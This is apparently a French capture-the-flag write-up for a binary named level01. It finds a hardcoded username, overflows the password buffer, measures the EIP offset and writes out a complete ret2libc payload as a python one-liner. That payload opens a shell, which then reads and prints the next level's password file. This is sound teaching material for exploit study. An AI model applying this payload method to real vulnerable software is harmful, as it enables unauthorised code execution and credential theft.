# Level 1

On commence par décompiler le code. On observe différentes choses intéressantes. On remarque que le programme attend 2 entrées. 

```C
printf("Enter Username: ");
puts("Enter Password: ");
```

Notre programme attend un `username` et un  `password`. 
La vérification du `username` se fait de par la fonction `verify_user_name` 

```C
printf("Enter Username: ");
fgets(a_user_name, 0x100, _reloc.stdin);
iStack20 = verify_user_name();
```

Le code décompilé de cette fonction est assez incompréhensible. On observe une chaine de caractères en dur dans le code.

```C
pcVar3 = (code *)"dat_wil";
```

On suppose que l'entrée attendu pour le `username` est `dat_wil`. On peut vérifier cela en rentrant cet `input` dans notre programme.

```
> ./level01
[...]
Enter Username: test_username
verifying username....

nope, incorrect username...
> ./level01
[...]
Enter Username: dat_wil
verifying username....

Enter Password:
```
Notre hypothèse est vérifié, notre programme attend `dat_wil` comme `username`.

Pour le `password`, cela semble plus complexe. En effet, le programme semble r'envoyer dans tout les cas `nope, incorrect password ...\n`.

```C
if (iStack20 == 0) {
	puts("Enter Password: ");
	fgets(auStack84, 100, _reloc.stdin);
	iStack20 = verify_user_pass((char *)auStack84);
	if ((iStack20 == 0) || (iStack20 != 0)) {
		puts("nope, incorrect password...\n");
		uVar1 = 1;
	}
	else {
		uVar1 = 0;
	}
}
```

On voit qu'au moment de la vérification du `password`, une fonction `verify_user_pass` est appelée. 

Le code décompilé de cette fonction n'est pas lisible. On voit seulement une chaine de caractères en dur dans le code 

```C
puVar2 = (uint8_t *)"admin";
```

En essayant de mettre  `admin` comme `password`, on obtiens toujours le même résultat, à savoir `nope, incorrect password...`

On observe que lorsqu'on saisit le `password`, la fonction `fgets` est appelé.

```C
undefined4 auStack84 [16];
fgets(auStack84, 100, _reloc.stdin);
```
Nous allons donc mettre 100 caractères dans notre `input` `password`, et voir ce qu'il se passe.

```
> gdb ./level01
> (gdb) r
[...]
Enter Username: dat_wil
[...]
Enter Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[...]
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
On a [généré](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) une chaine de 100 caractères. Notre programme a segault. Nous aimerons donc savoir le décalage entre le début de notre `buffer`et `eip`.

 Notre `eip` est 0x37634136. Ici le [décalage](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) est de `80`.
Notre programme n'exécute pas de `shell`. Nous pouvons ici utiliser l'exploit `RetToLibC`. 

Nous allons construire notre exploit de cette façon : 

```
[username_valide] + [A * Offset] + [adresse de system] + [DAMN] + [adresse de bin/sh]
```

Trouvons maintenant l'adresse  `system` et de `bin/sh`. 

```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
[...]
```
Nous pouvons maintenant construire notre payload. 

```
[dat_wil\n] + [A*80] + [\xd0\xae\xe6\xf7] + [DAMN] + [\xec\x97\xf8\xf7]

python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"DAMN"+"\xec\x97\xf8\xf7"' > /tmp/hack01
cat /tmp/hack01 - | ./level01
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```